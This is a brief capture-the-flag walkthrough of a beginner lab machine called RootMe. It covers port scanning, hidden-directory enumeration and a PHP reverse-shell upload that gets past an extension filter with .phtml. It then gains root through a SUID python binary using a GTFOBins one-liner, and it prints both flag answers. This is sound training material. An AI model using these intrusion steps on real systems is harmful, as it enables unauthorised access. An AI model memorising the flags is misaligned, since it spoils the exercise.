# RootMe

> A ctf for beginners, can you root me?

<br>

Process:
- 1) port scan machine:
  - `nmap -T4 <ip>`
  - open ports = **2**
  - `nmap -T4 -A -p 22,80 <ip>`
  - found 22:
    - service running = **ssh**
  - found 80:
    - version of apache = **2.4.29**
- 2) enumerate port 80:
  - find hidden directories:
    - `gobuster dir -u http://10.10.0.11 -w <wordlist>`
  - found hidden directory = **/panel/**
- 3) upload a php webshell to get a reverse shell:
  - download and adjust PHP reverse webshell from [PayloadAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
  - start netcat listener: `nc -lvnp 1234`
  - try to upload -- fail 
  - change file extension -- success with .phtml
  - execute shell by navigating to /uploads directory 
- 4) find user flag
  - `cat /var/www/user.txt` = **THM{y0u_g0t_a_sh3ll}**
- 5) escalate privileges
  - search for files with SUID permission set:
    - `find / -user root -perm /4000 2> /dev/null`
    - found: **/usr/bin/python**
  - exploit via GTFOBins code:
    - `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
  - get root flag
    - `cat /root/root.txt` = **THM{pr1v1l3g3_3sc4l4t10n}**